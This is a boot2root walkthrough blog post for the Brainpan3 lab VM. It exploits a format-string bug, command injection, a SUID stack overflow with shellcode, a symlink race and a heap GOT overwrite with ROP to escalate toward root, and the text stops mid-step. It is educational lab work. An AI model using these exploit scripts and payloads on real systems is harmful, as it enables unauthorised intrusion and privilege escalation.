---
layout: post
title:  "Vulnhub - Brainpan3"
date:   2015-09-21 18:03:59
categories: boot2root Pwnable
---

Brainpan3 is a typical boot2root VM that we boot and attempt to gain root access. This one is a bit long, but I hope it is entertaining and informative. Strap in!

### Tools of the trade
Two toolsets are used heavily throughout this writeup:

* [Pwndbg - Fancy GDB wrapper](https://github.com/zachriggle/pwndbg) 
* [Binjitsu - Python CTF Framework](https://github.com/binjitsu/binjitsu/) 

## Recon
First things first, let's see where the heck this box is on our virtual network. 

```
nmap -p- 192.168.224.0/24 -Pn --open -T5
```

```
-p- : Poke all 65536 ports
-Pn : Assume each IP address is alive
--open : Only show open ports
-T5 : Scan at the speed of Buzz Lightgear
```

We see an IP with a weird port of `1337` open.

```
Host is up (0.0020s latency).
Not shown: 65533 filtered ports, 1 closed port
PORT     STATE SERVICE
1337/tcp open  waste
```

## Open says me

Upon finding port `1337`, we can start having fun with Brainpan3. We can setup a small script to easily interact with the service:

```python
from pwn import * # pip install --upgrade git+https://github.com/binjitsu/binjitsu.git

HOST = '192.168.224.154'
PORT = 1337

r = remote(HOST, PORT)

r.interactive()
```

Our first image of Brainpan3 is shown below:

```
  __ )    _ \      \    _ _|   \  |   _ \    \      \  |     _ _| _ _| _ _|
  __ \   |   |    _ \     |     \ |  |   |  _ \      \ |       |    |    | 
  |   |  __ <    ___ \    |   |\  |  ___/  ___ \   |\  |       |    |    | 
 ____/  _| \_\ _/    _\ ___| _| \_| _|   _/    _\ _| \_|     ___| ___| ___|

                                                            by superkojiman




AUTHORIZED PERSONNEL ONLY
PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS

ACCESS CODE: 
```

Even though the text says `A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS`, the initial thought was, "Oh cool, 4 digits, Go Go Gadget Brute Force!". Turns out, the text wasn't lieing. The number definitely did change after 3 attempts. To Plan B (and for less than $40)!

Given a login prompt, we could try to overflow the input buffer in an attempt for a stack overflow. The problem with this approach would be that we don't have the binary to do analysis after the overflow. After a nice, hot shower (where all the CTF solutions are generated), the exploitation vector that makes the most sense is looking at format strings.

Let's give some format strings a go!

```
ACCESS CODE: %x.%x.%x.%x.%x.
ERROR #4: WHAT IS THIS, AMATEUR HOUR?
```

Herm.. are they filtering on `%x`? Let's try a different format string.

```
ACCESS CODE: %p.%p.%p.%p.
ERROR #1: INVALID ACCESS CODE: 0xbfcf8b1c.(nil).0x2691.0xbfcf8b1c.
```

Bingo! So we now know that this input is vulnerable to malicious format strings. Since we are looking for a 4 digit access code, we can assume it is probably stored on the stack. Let's try to use `%d`.

```
ACCESS CODE: %d.%d.%d.%d.%d.%d.
ERROR #1: INVALID ACCESS CODE: -1076917476.0.6970.-1076917476.0.10.
```

Ah! What is in the third slot here: `6970`. Let's try that access code:

```
ACCESS CODE: 6970

--------------------------------------------------------------
SESSION: ID-6439
  AUTH   [Y]    REPORT [N]    MENU   [Y]  
  --------------------------------------------------------------


  1  - CREATE REPORT
  2  - VIEW CODE REPOSITORY
  3  - UPDATE SESSION NAME
  4  - SHELL
  5  - LOG OFF

  ENTER COMMAND: 
```

And we are in! Before we proceed further, let's modify our script to automatically get past the access code:

* Send `%d.%d.%d.%d.%d.%d`
* Extract the third element (access code)
* Submit the access code for login

From here, we'll keep adding snippets of code to the script, but for the sake of brevity of the writeup, only the new code will be shown. Our result is below:

```python
# r - Our socket object

###
# Get access code
###
r.sendline('%d.' * 6)
r.recvuntil("ACCESS CODE: ")
output = r.recv()
code = output.split('.')[2]

log.info("Code identified: {}".format(code))

r.sendline(code)

r.interactive()
```

## Step 2

Now that we are logged in, we can do a bit more exploration. Oh look, we are already given a shell using Command `4`:

```
ENTER COMMAND: 4
SELECTED: 4
reynard@brainpan3 $ ls
total 0
-rw-rw-r-- 1 reynard reynard 22 May 10 22:26 .flag
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 give
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 up
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 let
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 down
```

Of course, superkojiman would rick roll hackers. Thanks!

We can try to overflow this `shell` script/binary:

```
reynard@brainpan3 $ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
*** stack smashing detected ***: ./shell terminated
```

No dice. Canary is in the way (supposedly).

After more exploration of trying the typical recon commands `whoami`, `uname -a`, ect, we can come to the conclusion that this shell is useless.

Let's try the other options:

```
ENTER COMMAND: 1
SELECTED: 1
REPORT MODE IS DISABLED IN THIS BUILD
```

Looks like report mode is currently disabled. We could try to turn the report on, but how?


### And now for something completely different

```
ENTER COMMAND: 2
SELECTED: 2

CODE REPOSITORY IS ALREADY ENABLED
```

Turning on the code repo enables a web service on port 8080, which also has a `/repo` directory containing the binaries used during this step:

![Web service](/assets/images/repo-directory.png)

Spending a little time with the binaries was interesting to see how they worked, but ultimately, nothing useful came from it. I'm not sure if this was a red herring or if there was another vulnerability here.

### Back to your normal programming


The last functionality that we haven't looked at yet is the `Update Session Name` function:

```
ENTER COMMAND: 3
SELECTED: 3
ENTER NEW SESSION NAME: thebarbershopper 
--------------------------------------------------------------
SESSION: thebarbershopper

  AUTH   [Y]    REPORT [N]    MENU   [Y]  
--------------------------------------------------------------
```

Interesting, can we replicate a string format vulnerability from the access code with the session name?

```
ENTER COMMAND: 3
SELECTED: 3
ENTER NEW SESSION NAME: %p.%p.%p.%p.%p.
--------------------------------------------------------------
SESSION: 0xbfcf89cc.0x104.0x252e7025.0x70252e70.0x2e70252e.

  AUTH   [Y]    REPORT [N]    MENU   [Y]  
--------------------------------------------------------------
```

Why yes, yes we can. Let's dump a good portion of the stack and see what we have. We'll start by sending 70 `%x.` Note, we add the period at the end only to allow easier splitting of our resulting string. This allows for easier correlation between the individual format strings and their output.

```
ENTER COMMAND: SELECTED: 3
ENTER NEW SESSION NAME: --------------------------------------------------------------
SESSION: bf9a747c.104.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.ff0a2e78.b77a3c20.bf9a75cc.0.b77a3000.b77a3ac0.b77a4898.b75f7940.b76690b5.b77a3ac0.59.4e.59.b77a38a0.b77a3000.b77a3ac0.
\xff <z\xb7�u\x9a\xbf
  AUTH   [Y]    REPORT [N]    MENU   [Y]  
--------------------------------------------------------------
```

We are looking at a lot of repeating values here. 

```python
>>> from pwn import *
>>> unhex('252e7825')[::-1]
'%x.%'
```

Looks like those repeating characters are our format string buffer. There is one segment in this format string that is interesting:

```python 
# b77a3ac0.59.4e.59.b77a38a0.b77a3000.b77a3ac0.
>>> from pwn import *
>>> for item in 'b77a3ac0.59.4e.59.b77a38a0.b77a3000.b77a3ac0.'.split('.'):
        unhex(item)

'\xb7z:\xc0'
'Y'
'N'
'Y'
'\xb7z8\xa0'
'\xb7z0\x00'
'\xb7z:\xc0'
```

The `Y, N, Y` looks very similar to the `Y, N, Y` of the dialog shown from the command menu. Can we try and write a buffer over the `Y, N, Y` so that it becomes `Y, Y, Y`? Let's grab where in the format string the `4e` is in order to know how much to overflow.

```python
# Update Session name command
r.sendline('3')

# Send format string
shellcode = '%x.' * 70

# Wipe the input buffer so we aren't reading old data
r.clean()

r.sendline(shellcode)
r.recvuntil("SESSION: ")

# Grab the format string output
session_name = r.recvuntil('\n').split('.')

# Isolate the 'N' (0x4e) in our format string
n_index = session_name.index('4e')
log.info("Report 'N' at offset {}".format(n_index))

```

After a few tries of different lengths, we succeed in overwriting the `N` with a `Y`.

```python
n_index = session_name.index('4e')
# Resend a buffer of 'Y's up to the location of the 'N'
r.sendline('3')
r.sendline('Y' * (4*(n_index-2) + 1) )
```

```
SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
  AUTH   [Y]    REPORT [Y]    MENU   [Y]  
  --------------------------------------------------------------


  1  - CREATE REPORT
  2  - VIEW CODE REPOSITORY
  3  - UPDATE SESSION NAME
  4  - SHELL
  5  - LOG OFF

  ENTER COMMAND: $  
```

Notice the Report now has `[Y]`! Boom!n. Let's see what we can do with reports.

## Step 3

```
ENTER COMMAND: $ 1
SELECTED: 1

ENTER REPORT, END WITH NEW LINE:

$ this is my first report!

REPORT [this is my first report!@
SENDING TO REPORT MODULE

[+] WRITING REPORT TO /home/anansi/REPORTS/20150910050336.rep
[+] DATA SUCCESSFULLY ENCRYPTED
[+] DATA SUCCESSFULLY RECORDED
[+] RECORDED [\xbf\xa3\xa2\xb8����\xa6\xb2����\xb8\xbf����\xa4\xb9\xbf���]
```

From the text, it appears that our report is encrypted in some fashion and is stored at `/home/anansi/REPORTS/20150910050336.rep`. The binary for handing reporting is found in the `/repo` directory, so analyzing that will probably be of use, but we can try some low hanging fruit first before diving into the reverse engineering.

After a few fuzzing attempts looking for buffer overflow and command injection, we are given the following:

```
$ `notacommand`

REPORT [`notacommand`rst report!@ing]
SENDING TO REPORT MODULE

sh: 1: notacommand: not found
```

Que wha?! We are given a `command not found` error message when trying to execute commands via back ticks. Could this mean command execution?

```
$ `whoami`

REPORT [`whoami`mand`rst report!@```]
SENDING TO REPORT MODULE

sh: 1: Syntax error: EOF in backquote substitution
```

Hmm.. more error messages. This is probably coming through stderr. Could we receive command output by piping output to stderr?

```
$ `whoami >&2`

REPORT [`whoami >&2`4]
SENDING TO REPORT MODULE

anansi
```

Nice! Now the fun part, let's try to get a shell. 

```
ENTER COMMAND: $ 1

ENTER REPORT, END WITH NEW LINE:

`/bin/bash -i >&2`

REPORT [`/bin/bash -i >&2`]
SENDING TO REPORT MODULE

bash: cannot set terminal process group (5677): Inappropriate ioctl for device
bash: no job control in this shell
anansi@brainpan3:/$ whoami
anansi
anansi@brainpan3:/$ uname -a
Linux brainpan3 3.16.0-41-generic #55~14.04.1-Ubuntu SMP Sun Jun 14 18:44:35 UTC 2015 i686 i686 i686 GNU/Linux
anansi@brainpan3:/$  
```

And we have a user shell! As normal, let's modify our exploit script to retrieve a shell for us automagically:

```python
###
# Get user shell
###

# Just a bit of fun to check that we have a shell
for command in ['uname -a', 'whoami', 'id']:
    r.clean()
    r.sendline('1')
    r.sendline('$({} >&2)'.format(command))

    r.recvuntil("SENDING TO REPORT MODULE")
    output = r.recvuntil('[+]').split('\n')[2]
    log.success("{} - {}".format(command, output))

# Our actual shell payload
r.clean()
r.sendline('1')
r.sendline('$(/bin/bash -i >&2)')

r.interactive()
```

## Step 4

Time to begin basic recon of the `anansi` shell:

```
anansi@brainpan3:/$ $ whoami
anansi

anansi@brainpan3:/$ $ uname -a
Linux brainpan3 3.16.0-41-generic #55~14.04.1-Ubuntu SMP Sun Jun 14 18:44:35 UTC 2015 i686 i686 i686 GNU/Linux

anansi@brainpan3:/$ $ id
uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)
```

Assuming we need to do some sort of privilege escalation, let's look for SUID binaries:

```
anansi@brainpan3:/$ $ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/sbin/pppd
/usr/sbin/uuidd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/pt_chown
/usr/lib/eject/dmcrypt-get-device
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/at
/usr/bin/chsh
/usr/bin/mtr
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/sudo
/home/reynard/private/cryptor
/bin/su
/bin/ping
/bin/fusermount
/bin/mount
/bin/umount
/bin/ping6
```

The binary that sticks out here is `/home/reynard/private/cryptor`. Can we execute this binary?


```
anansi@brainpan3:/home/anansi$ $ /home/reynard/private/cryptor
/home/reynard/private/cryptor
Usage: /home/reynard/private/cryptor file key
```

So we can execute the `cryptor` binary. Let's try to look at this binary:

```
anansi@brainpan3:/$ $ cd ~
cd ~
anansi@brainpan3:/home/anansi$ $ cp /home/reynard/private/cryptor .
cp /home/reynard/private/cryptor .
anansi@brainpan3:/home/anansi$ $ ls -la
```

Let's pull this binary off Brainpan3 and onto our local machine. It looks like we are only allowed port `8080` out of the server. If we don't activate the code repo (Command `2`), then we can pull files off via Python's built in web server.

```
anansi@brainpan3:/home/anansi$ $ python -m SimpleHTTPServer 8080
python -m SimpleHTTPServer 8080
```

On our host:

```
wget http://192.168.224.154:8080/cryptor
```

And now we have our binary:

```
192.168.224.156 - - [10/Sep/2015 06:36:19] "GET / HTTP/1.1" 200 -
192.168.224.156 - - [10/Sep/2015 06:36:25] "GET /cryptor HTTP/1.1" 200 -
```

Quick sanity check for the `cryptor` binary:
```
ctf@ctf-barberpole:~/ctfs/brainpan3/files$ checksec cryptor
[*] '/home/ctf/ctfs/brainpan3/files/cryptor'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
```

Awesome, no canary and no NX. This means, assuming we can find a buffer overflow, we can jump back to our shellcode on the stack/heap and execute our payload from there, avoiding ROP or other shenanigans.

Looking at the binary in IDA, we can see a buffer overflow condition. We see a buffer that is allocated 100 bytes.

![Buffer Overflow 1](/assets/images/cryptor-buff1.png)

There is then a check if the first argument (`argv[1]`) is less than or equal to 116 bytes.

![Buffer Overflow 2](/assets/images/cryptor-buff2.png)

Here we are given the situation of writing 116 bytes into a 100 byte buffer, potentially causing an overflow. With this knowledge, let's test it dynamically.

Open `gdb ./cryptor` with [Pwndbg](https://github.com/zachriggle/pwndbg) enabled and throw a 116 byte string at crytor with a junk second string.

Create the 116 byte `cyclic` string using [Binjitsu](https://github.com/binjitsu/binjitsu/) in order to help pin point where in the string our overflow happens. We know what it should be from static analysis, but it is always nice to have more than one data point.

```
>>> from pwn import *
>>> cyclic(116)
'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaab'
```

Run the binary with our 116 byte string.

```
Loaded 53 commands.  Type pwndbg for a list.
Reading symbols from ./cryptor...(no debugging symbols found)...done.
Only available when running
pwn> r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaab zzzz
```

Watch as we get a fancy crash.

```
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
[----------REGISTERS----------]
 EAX  0x0
 EBX  0x62616164 ('daab')
 ECX  0x0
 EDX  0x0
 EDI  0x636e652e ('.enc')
 ESI  0x0
 EBP  0x61616179 ('yaaa')
 ESP  0xffffcb08 <-- 'baab'
 EIP  0x6261617a ('zaab')
[----------BACKTRACE----------]

Program received signal SIGSEGV
```

Awesome, so we have a crash at offset `zaab` in our `cyclic` string. Let's create our payload by replacing the `zaab` to know that we have surgical control of EIP.

```
>>> shellcode = 'A' * cyclic_find('zaab') + 'BBBB'
>>> shellcode += 'C' * (116 - len(shellcode))
>>> print shellcode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCC
```
If we are correct, we should see `BBBB` in EIP.

```
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
[-------------------------------------REGISTERS-------------------------------------]
*EAX  0x0
*EBX  0x43434343 ('CCCC')
*ECX  0x0
*EDX  0x0
*EDI  0x636e652e ('.enc')
*ESI  0x0
*EBP  0x41414141 ('AAAA')
*ESP  0xffffcb08 <-- 'CCCC'
*EIP  0x42424242 ('BBBB') <-- w00t w00t!
[-------------------------------------BACKTRACE-------------------------------------]
>   Program received signal SIGSEGV
```

We also notice from static analyis that the second argument is stored in a global array found at `0x804a080`. If we write our shellcode in the global array, we can point EIP to that buffer and potentially win.

Our plan of attack here is as follows:

* Overwrite the return address `BBBB` with `0x804a080`
* Drop `/bin/sh` shellcode in the second argument in order to gain a shell

Our resulting testing script is below:

```python
from pwn import * # pip install --upgrade git+https://github.com/binjitsu/binjitsu.git

shellcode = 'A' * cyclic_find('zaab') + p32(0x804a080)
shellcode += 'C' * (116 - len(shellcode))

r = process(['./cryptor', shellcode, asm(shellcraft.sh())])

r.interactive()
```

And we have a shell locally. Now we have to execute this command on the server. In order to do this, we create the command in our existing script, then send the command from the script. The process is shown below:

```python
offset = cyclic_find('zaab')
buffer = 116 - len(shellcode)

# Yay easy /bin/sh shells
binsh_shellcode = asm(shellcraft.sh())

# Build argv1
argv1 = '"A" * {} + "{}" + "C" * {}'.format(offset, r'\x80\xa0\x04\x08', buffer)

# Build argv2
argv2 = ''.join('\\x{}'.format(enhex(binsh_shellcode)[x:x+2]) for x in xrange(0, len(enhex(binsh_shellcode)), 2))

# Final command
actual_shellcode = """./cryptor $(python -c 'print {}') $(python -c 'print "{}"')""".format(argv1, argv2)

log.info(actual_shellcode)

# Sometimes the command didn't work. This will repeat throwing the command until we get a reynard shell
r.sendline('cd /home/reynard/private')
while True:
    r.clean()
    r.sendline(actual_shellcode)
    r.clean()
    r.sendline('id')
    output = r.recv()
    if 'reynard' in output:
        break

log.info("Shell recevied: reynard")

r.interactive()
```

And we are given our reynard shell!

```
[*] ./cryptor $(python -c 'print "A" * 100 + "\x80\xa0\x04\x08" + "C" * 12') $(python -c 'print "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x6a\x0b\x58\x89\xe3\x31\xc9\x99\xcd\x80"')
[*] Shell recevied: reynard
[*] Switching to interactive mode
uid=1000(anansi) gid=1003(webdev) euid=1002(reynard) groups=1002(reynard)
```

## Step 4

A little more recon shows the following cron job:

```
$ cat /etc/cron.d/*
* * * * * root cd /opt/.messenger; for i in *.msg; do /usr/local/bin/msg_admin 1 $i; rm -f $i; done
```

Looking at the privileges of `/opt/.messenger` we see the following:

```
$ ls -la /opt
total 12
drwxr-xr-x  3 root root 4096 May 19 23:51 .
drwxr-xr-x 21 root root 4096 Jun 17 22:05 ..
drwxrwx---  3 root dev  4096 Jun 10 22:32 .messenger
```

We see a command that is executed by root, pulling files from the `/opt/.messenger` directory. We need a user with `dev` group permissions in order for this to happen.

Examining the tail of `/etc/passwd`, we see `puck`. Looking at his `id`:

```
$ id puck
uid=1001(puck) gid=1001(puck) groups=1001(puck),1004(dev)
```

He does have `dev` privileges allowing him to access `/opt/.messenger`. Let's take a look at what `puck` has on the box.

```
$ cd /home/puck
$ ls -la
total 12
drwxrwx--- 2 reynard dev     4096 Jun 17 22:11 .
drwxr-xr-x 3 root    root    4096 May 19 23:35 ..
-rw-r--r-- 1 reynard reynard   21 Jun 17 22:11 key.txt
$ cat key.txt
9H37B81HZYY8912HBU93
```

Are there other keys on the box?

```
$ find / -name key* 2>/dev/null
/mnt/usb/key.txt
```

Not sure what these keys are for. What does one do when hitting a small roadblock? Moar recon!

Looking at the `netstat` we see another service is active:

```
$ netstat -antop | grep LIST
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -                off (0.00/0/0)
tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      -                off (0.00/0/0)
tcp        0      0 127.0.0.1:7075          0.0.0.0:*               LISTEN      -                off (0.00/0/0)
```

Connecting to it

```
$ nc localhost 7075
Incorrect key
```

Not having any idea what service this is coming from, let's perform a system wide `strings` to try and find the binary responsible for this.

```
$ find / -executable > exes
$ for f in $(cat exes); do echo $f >> output; strings $f | grep "Incorrect key" >> output; done
$ grep Incorrect output -B1
/usr/local/sbin/trixd
Incorrect key
```

And to confirm

```
$ strings /usr/local/sbin/trixd | grep Incorrect
Incorrect key
```

Loading `trixd` into IDA we see that the binary is checking to see if `/mnt/usb/key.txt` is a symlink, and if so, exits immediately. From here, it opens both `/mnt/usb/key.txt` and `/home/puck/key.txt` and checks if they are both the same. If they are the same, we are given a `/bin/sh` shell. Otherwise, we see the `Incorrect key` message.

The idea to beat this is to connect to the service, delete `/mnt/usb/key.txt`, then symlink `/home/puck/key.txt` to `/mnt/usb/key.txt`. If timed correctly, we will symlink after the check, bypassing it.

Not wanting to put `binjitsu` on the VM itself, we can use standard library functions for this portion.

Again, in order to make this work via one script, we will write a script to disk and execute it in order to get our shell with `puck`.

Our new code is below:

```python

# Create our symlink racer on the server

r.sendline(""" echo "
import os
import socket
import telnetlib
import subprocess

HOST = 'localhost'
PORT = 7075

try:
    os.remove('/mnt/usb/key.txt')
except:
    pass

# Ensure we have a file to begin with
subprocess.check_output(['touch', '/mnt/usb/key.txt'])

# Connect and check for symlink
r = socket.socket()
r.connect((HOST, PORT))

# Quickly remove the non-symlinked file and re-symlink
os.remove('/mnt/usb/key.txt')
os.symlink('/home/puck/key.txt', '/mnt/usb/key.txt')

# Try for our shellz - Thanks for #livectf for showing this in previous CTFs.
t = telnetlib.Telnet()
t.sock = r
t.interact()

r.close()
" > win.py
""")

r.sendline("python win.py")
r.clean()
r.sendline("whoami")
output = r.recv()
log.success("Shell received: {}".format(output))
sleep(1)

r.interactive()
```

## Step 5

Now we are puck and need to finish what we believe is the last step to receiving a `root` shell. Going back to our cronjob, we need to analyze the `msg_admin` binary. We pull it off the VM in a similar manner as the `cryptor` binary.

Quick sanity check

```
ctf@ctf-barberpole:~/ctfs/brainpan3/files$ checksec msg_admin 
[*] '/home/ctf/ctfs/brainpan3/files/msg_admin'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
```

Canaries, NX on.

Is ASLR is on?
```
$ cat /proc/sys/kernel/randomize_va_space
2
```

Yep. Time to pull out all the stops. From the cronjob, we realize that the binary takes a file. Analyzing the binary statically, we see that the file needs to contain lines of names and messages seperated by a `|`. Let's create a small payload generation script to test this.

```python
# make-pwnmsg.py
from pwn import *

with open('pwn.msg', 'w') as f:
    f.write('{}|{}\n'.format('a'*4, 'A'*10))
    f.write('{}|{}\n'.format('b'*4, 'B'*10))
    f.write('{}|{}\n'.format('b'*4, 'C'*10))

```

Verify its contents.

```
ctf@ctf-barberpole:~/ctfs/brainpan3/files$ cat pwn.msg
aaaa|AAAAAAAAAAAA
bbbb|BBBBBBBBBBBB
bbbb|CCCCCCCCCCCC
```

Execute the payload in `gdb`.

```
$ gdb ./msg_admin
pwn> r 1 pwn.msg
```

We noticed a few `malloc`s in the static analysis. Let's see how the heap is layed out.

```
pwn> hexdump 0x804c390 120

+0000 0x804c390  a8 c3 04 08  11 00 00 00  61 61 61 61  00 00 00 00  |....|....|aaaa|....|
+0010 0x804c3a0  00 00 00 00  d1 00 00 00  41 41 41 41  41 41 41 41  |....|....|AAAA|AAAA|
+0020 0x804c3b0  41 41 00 00  00 00 00 00  00 00 00 00  00 00 00 00  |AA..|....|....|....|
+0030 0x804c3c0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  |....|....|....|....|
*
+00e0 0x804c470  00 00 00 00  11 00 00 00  01 00 00 00  88 c4 04 08  |....|....|....|....|
+00f0 0x804c480  98 c4 04 08  11 00 00 00  62 62 62 62  00 00 00 00  |....|....|bbbb|....|
+0100 0x804c490  00 00 00 00  d1 00 00 00  42 42 42 42  42 42 42 42  |....|....|BBBB|BBBB|
+0110 0x804c4a0  42 42 00 00  00 00 00 00  00 00 00 00  00 00 00 00  |BB..|....|....|....|
```

It appears that each of our messages is back to back in the heap. It also looks like two pointers exist after our message (see address `0x804c47c` and `0x804c480`). How much space is available between our message and the last pointer.

```
>>> 0x804c480 - 0x804c3a8
216
```

Suspicious that we can overflow the two pointers with `A`s, let's throw data to see if we can control those pointers.

```python
# make-pwnmsg.py
from pwn import *

with open('pwn.msg', 'w') as f:
    f.write('{}|{}\n'.format('a'*4, cyclic(216)))
    f.write('{}|{}\n'.format('b'*4, 'B'*10))
    f.write('{}|{}\n'.format('b'*4, 'C'*10))
```

Executing the payload the same again in gdb.

```
[-------------------------------------REGISTERS-------------------------------------]
*EAX  0x62626262 ('bbbb')
*EBX  0x804c170 <-- 'bbbb'
*ECX  0x804c170 <-- 'bbbb'
*EDX  0x63616164 ('daac')
*EDI  0x0
*ESI  0xffffc9d0 <-- 1
*EBP  0xffffca68 <-- 0
*ESP  0xffffc83c --> 0x8048cd0 (main+539) <-- mov    eax, dword ptr [ebp - 0x4c]
*EIP  0xf7e95d82 <-- mov    dword ptr [edx], eax
[---------------------------------------CODE----------------------------------------]
 => 0xf7e95d82    mov    dword ptr [edx], eax
[-------------------------------------BACKTRACE-------------------------------------]
>  f 0 f7e95d82
   f 1  8048cd0 main+539
   f 2 f7e23a83 __libc_start_main+243
   f 3  8048741 _start+33
Program received signal SIGSEGV
```

Boom! Gotta love seeing `SIGSEGV`, eh? Our crashing instruction is `mov [edx], eax`.

Looks like we are overwriting the data in address `daac` (edx - from our cyclic function) with `bbbb` (eax - our second message). This is effectively a write-what-where condition, where we can write 4 bytes of whatever, wherever we want.

Looking at `0x804cd0` (our backtrace at frame `1`), we see that we are in a strcpy. Set breakpoint there and restart:

```
pwn> bp 0x8048ccb

[---------------------------------------CODE----------------------------------------]
=> 0x8048ccb <main+534>    call   0x8048630 <strcpy@plt>
    dest:      0x63616164 ('daac')
    src:       0x804c170 <-- 'bbbb'
```

At the point of crash, our stack is in the following state:

```
[---------------------------------------STACK---------------------------------------]
00:0000| esp  0xffffc83c --> 0x8048cd0 (main+539) <-- mov    eax, dword ptr [ebp - 0x4c]
01:0004|      0xffffc840 <-- 0x63616164
02:0008|      0xffffc844 --> 0x804c170 <-- 'bbbb'
03:000c|      0xffffc848 --> 0x804c008 <-- 0xfbad2488
04:0010|      0xffffc84c <-- 'aaaabaaacaaadaa...'
05:0014|      0xffffc850 <-- 'baaacaaadaaaeaa...'
06:0018|      0xffffc854 <-- 'caaadaaaeaaafaa...'
07:001c|      0xffffc858 <-- 'daaaeaaafaaagaa...'
```

We see our controlled buffer at stack address `0xffffc84c`. We need to perform a stack pivot in order to move ESP to our buffer so we can start our ROP sequence. 

Set `bbbb` to the address of a `stack move 20` from binjitsu (`rop.search(move=20).address`) and set the offset of `daac` to the `strtok` GOT entry.

```python
from pwn import *

elf = ELF('msg_admin')
rop = ROP(elf)

pivot = rop.search(move=20).address # Need to move the stack 20 bytes to get to our ROP chain
strtok = elf.got['strtok']

log.info("Pivot: {}".format(hex(pivot)))
log.info("Strtok: {}".format(hex(strtok)))

# Overwrite `strtok` in GOT with the stack pivot
with open('pwn.msg', 'w') as f:
    sc = 'A' * cyclic_find('daac') + p32(strtok)
    sc += 'B' * (216 - len(sc))
    f.write('{}|{}\n'.format('a'*4, sc))
    f.write('{}|{}\n'.format(p32(pivot), 'B'*12))
```

Awesome, so now we have stack control and EIP control.. aka.. prime ROP condition. ;-)

Let's check out relevant ROP gadgets using [ROPGadget](https://github.com/JonathanSalwan/ROPgadget). One note, be sure to increase the `--depth` so that we can see more gadgets. In this case, it was important. We wouldn't be able to find our `clear eax` gadget without it.

```
$ ROPgadget --depth 30 --binary msg_admin
```

Two gadgets from the list stick out as interesting.

The gadget below will allow us to increment `eax` using a dereferenced pointer.

```
0x08048feb : add eax, dword ptr [ebx + 0x1270304] ; ret
```

The next gadget will give us a way of clearing `eax`. Note, this gadget wasn't visible from the default `ROPgadget` setting of `--depth 10`.

```
0x08048790 : mov eax, 0x804b074 ; sub eax, 0x804b074 ; ...gadgets that don't matter... ; ret
```

Our plan of attack will be as follows (spoiler alert, the same as pretty much every CTF ASLR bypass):

* Deference an entry in the GOT.
* Calculate the difference between the given entry and `system`.
* Add this difference to our dereferenced value.
* Call `system('/tmp/foo')` where /tmp/foo contains our commands.

Because we want to reduce the number of add offset instructions, let's try and find which GOT entry in `msg_admin` is closest to `system` in their libc.

```python
from pwn import *

elf = ELF('msg_admin')
libc = ELF('libc.so.6')

for symbol in elf.symbols:
    try:
        if libc.symbols[symbol] < libc.symbols['system']:
            print symbol, hex(libc.symbols['system'] - libc.symbols[symbol])
    except:
        pass
```

```
$ python find-good-addr.py 
